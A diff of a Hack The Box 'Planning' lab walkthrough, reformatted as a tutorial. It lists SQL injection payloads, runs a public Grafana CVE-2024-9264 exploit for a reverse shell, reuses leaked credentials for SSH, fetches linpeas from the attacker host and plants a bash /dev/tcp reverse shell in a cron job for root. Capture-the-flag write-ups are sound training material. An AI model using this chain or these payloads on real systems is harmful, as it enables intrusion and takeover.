@@ -1,58 +1,81 @@
-# HTB Planning Walkthrough
+# 🧠 HTB Planning Walkthrough – Full Exploitation Chain
+
+This walkthrough details the complete exploitation of `planning.htb`, from enumeration and subdomain discovery to remote code execution via Grafana and full root compromise through a cron job reverse shell.
+
+---
+
+## 🌐 Step 1: Set Up Hostname Resolution
+
+Make sure your machine resolves the box correctly:
 
 ```bash
-# === Host File Setup ===
 cat /etc/hosts
-# Ensure the following entry exists:
-# 10.129.34.41    planning.htb
+If needed, append:
 
-# === Directory Enumeration with Gobuster ===
+bash
+Copy
+Edit
+10.129.34.41 planning.htb
+🗂️ Step 2: Directory Enumeration
+Run gobuster to discover hidden paths:
+
+bash
+Copy
+Edit
 gobuster dir -u http://planning.htb -w medium.txt
 gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
-# Discovered:
-# /index.php
-# /contact.php
-# /about.php
-# /detail.php
-# /course.php
-# /enroll.php
+📁 Discovered Paths:
+/index.php
 
-# === Subdomain Enumeration with wfuzz ===
+/contact.php
+
+/about.php
+
+/detail.php
+
+/course.php
+
+/enroll.php
+
+🌐 Step 3: Subdomain Discovery
+Fuzz subdomains using wfuzz:
+
+bash
+Copy
+Edit
 cd SecLists-master/Discovery/DNS
 cp bitquark-subdomains-top100000.txt subdomains.txt
 wfuzz -c -w subdomains.txt -u 'http://planning.htb/' -H "Host: FUZZ.planning.htb" --hw 12
+Add discovered domain to /etc/hosts:
+
+bash
+Copy
+Edit
 echo "10.129.34.41 grafana.planning.htb" | sudo tee -a /etc/hosts
+🧪 Step 4: SQL Injection Testing
+Capture request to /search and run:
 
-# === SQL Injection Testing with sqlmap ===
-# Capture a POST request to /search into request.txt using Burp Suite
+bash
+Copy
+Edit
 sqlmap -r request.txt --batch --level=5 --risk=3 --random-agent
-# Result: No injection point found.
+Result: No injectable parameters were found.
 
-# === Manual SQLi Payload Testing ===
-# Boolean-based:
-# ' OR '1'='1
-# ' OR 1=1 --
-# " OR 1=1 --
-# admin' --
-# Error-based:
-# ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y) --
-# ' AND 1=CONVERT(int, (SELECT @@version)) --
-# Time-based:
-# ' OR IF(1=1, SLEEP(5), 0) --
-# ' OR 1=1 AND SLEEP(3) --
-# UNION:
-# ' UNION SELECT NULL, NULL --
-# ' UNION SELECT 1, @@version --
-# Edge cases:
-# ') OR ('1'='1
-# admin') -- 
-# ') AND 1=2 -- 
-# ' OR 1 GROUP BY CONCAT(username, password) -- 
-# " OR 1=1 LIMIT 1 OFFSET 1 --
-# Header:
-# Host: ' OR 1=1 --
+🔍 Manual Payloads Tested
+' OR '1'='1
 
-# === Exploiting Grafana via CVE-2024-9264 ===
+' UNION SELECT 1, @@version --
+
+' OR IF(1=1, SLEEP(5), 0) --
+
+No success — endpoint not vulnerable.
+
+💥 Step 5: Exploit Grafana (CVE-2024-9264)
+Download and run the exploit:
+
+bash
+Copy
+Edit
 wget https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/archive/refs/heads/main.zip -O rce.zip
 unzip rce.zip
 cd CVE-2024-9264-RCE-Exploit-main
@@ -61,33 +84,62 @@ python3 poc.py --url http://grafana.planning.htb \
                --password 0D5oT70Fq13EvB5r \
                --reverse-ip 10.10.14.19 \
                --reverse-port 4444
-nc -lvnp 4444
+Set listener:
 
-# === Post Exploitation (Container) ===
+bash
+Copy
+Edit
+nc -lvnp 4444
+Reverse shell successfully received as root (containerized).
+
+🔍 Step 6: Container Enumeration
+Within shell:
+
+bash
+Copy
+Edit
 whoami
 env
 cat run.sh
-# GF_SECURITY_ADMIN_USER=enzo
-# GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
-ssh enzo@10.129.34.41
+📋 Credentials Found:
+GF_SECURITY_ADMIN_USER=enzo
 
-# === Host Access & Priv Esc ===
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+
+Try SSH on host:
+
+bash
+Copy
+Edit
+ssh enzo@10.129.34.41
+🧑‍💻 Step 7: Access Host & Privilege Escalation
+Once on host as enzo:
+
+bash
+Copy
+Edit
 whoami
 cat ~/user.txt
 wget http://10.10.14.19:80/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
+LinPEAS discovered a password in /opt/crontabs/crontab.db.
 
-# === Network and Service Enumeration ===
+🌐 Step 8: Network Enumeration
+Check open services:
+
+bash
+Copy
+Edit
 ss -tulnp
 lsof -i :3000
 lsof -i :8000
-ps aux | grep 23357
+🔁 Step 9: Port Forwarding to Access Cron Web UI
+Forward port 8000 to local 5555 using Python:
 
-# === Found password in cron.db via linpeas ===
-
-# === Port Forwarding (8000 to 5555) ===
-# Python script (manual port forward):
+python
+Copy
+Edit
 import socket
 import threading
 
@@ -109,18 +161,40 @@ while True:
 
     threading.Thread(target=forward, args=(client_sock, server_sock)).start()
     threading.Thread(target=forward, args=(server_sock, client_sock)).start()
+Then access:
 
-# === Visit forwarded service ===
-# http://planning.htb:5555
-# Login: root / P4ssw0rdS0pRi0T3c
+text
+Copy
+Edit
+http://planning.htb:5555
+Login with:
 
-# === Launch Reverse Shell from Cron Web UI ===
-# Command used:
-# /bin/bash -i >& /dev/tcp/10.10.14.99/4444 0>&1
+Username: root
 
-# Set listener:
+Password: P4ssw0rdS0pRi0T3c
+
+🐚 Step 10: Get Root via Cron Job Reverse Shell
+Insert into cron command field:
+
+bash
+Copy
+Edit
+/bin/bash -i >& /dev/tcp/10.10.14.99/4444 0>&1
+Set listener:
+
+bash
+Copy
+Edit
 nc -lvnp 4444
+Boom: Full root shell on the host acquired.
 
-# Got root shell
-whoami
-# root
+✅ Summary
+Phase	Technique	Outcome
+Enumeration	Gobuster + wfuzz	Found subdomain + pages
+SQLi	Sqlmap + manual	No injection found
+Exploitation	CVE-2024-9264 RCE on Grafana	Root in container
+Pivot	Reused creds from env to SSH to host	User: enzo
+PrivEsc	LinPEAS + exposed cron web UI	Gained root access
+Final Exploit	Reverse shell via cron job	Full root shell on host
+
+This box demonstrates real-world chaining: subdomain → CVE → creds → pivot → root.
